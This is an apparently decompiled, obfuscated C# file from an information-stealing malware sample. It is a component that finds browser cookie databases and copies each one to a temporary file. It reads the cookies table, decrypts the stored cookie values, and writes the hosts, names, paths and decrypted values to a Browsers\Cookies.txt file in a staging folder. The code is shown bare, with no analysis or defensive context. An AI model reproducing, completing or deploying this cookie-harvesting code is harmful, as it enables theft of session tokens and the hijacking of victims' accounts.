using System;
using System.Collections.Generic;
using System.IO;
using System.Text;
using ns13;
using ns14;
using ns30;
using ns35;

namespace ns29
{
	// Token: 0x02000030 RID: 48
	internal class Class15
	{
		// Token: 0x060001A9 RID: 425 RVA: 0x0000D490 File Offset: 0x0000B690
		public static void smethod_0()
		{
			string text = "";
			foreach (Class16 @class in Class15.smethod_1())
			{
				text += @class.ToString();
			}
			if (text != "")
			{
				if (!Directory.Exists(GClass9.string_6 + "\\Browsers"))
				{
					Directory.CreateDirectory(GClass9.string_6 + "\\Browsers");
				}
				File.WriteAllText(GClass9.string_6 + "\\Browsers\\Cookies.txt", text, Encoding.Default);
			}
		}

		// Token: 0x060001AA RID: 426 RVA: 0x0000D544 File Offset: 0x0000B744
		public static List<Class16> smethod_1()
		{
			List<Class16> list = new List<Class16>();
			string[] string_ = GClass9.string_15;
			for (int i = 0; i < string_.Length; i++)
			{
				List<Class16> list2 = Class15.smethod_2(string_[i]);
				if (list2 != null)
				{
					list.AddRange(list2);
				}
			}
			return list;
		}

		// Token: 0x060001AB RID: 427 RVA: 0x0000D580 File Offset: 0x0000B780
		private static List<Class16> smethod_2(string string_0)
		{
			if (!File.Exists(string_0))
			{
				return null;
			}
			List<Class16> result;
			try
			{
				string text = GClass9.string_6 + "test.fv";
				if (File.Exists(text))
				{
					File.Delete(text);
				}
				File.Copy(string_0, text, true);
				Class7 @class = new Class7(text);
				List<Class16> list = new List<Class16>();
				@class.method_4("cookies");
				for (int i = 0; i < @class.method_1(); i++)
				{
					try
					{
						string text2 = string.Empty;
						try
						{
							text2 = Encoding.UTF8.GetString(Class21.smethod_1(Encoding.Default.GetBytes(@class.method_0(i, 12)), null));
						}
						catch
						{
						}
						if (text2 != "")
						{
							list.Add(new Class16
							{
								String_0 = @class.method_0(i, 1),
								String_1 = @class.method_0(i, 2),
								String_3 = @class.method_0(i, 4),
								String_4 = @class.method_0(i, 5),
								String_5 = @class.method_0(i, 6),
								String_2 = text2
							});
							Class15.int_0++;
						}
					}
					catch
					{
					}
				}
				File.Delete(text);
				result = list;
			}
			catch
			{
				result = null;
			}
			return result;
		}

		// Token: 0x040000B5 RID: 181
		public static int int_0;
	}
}
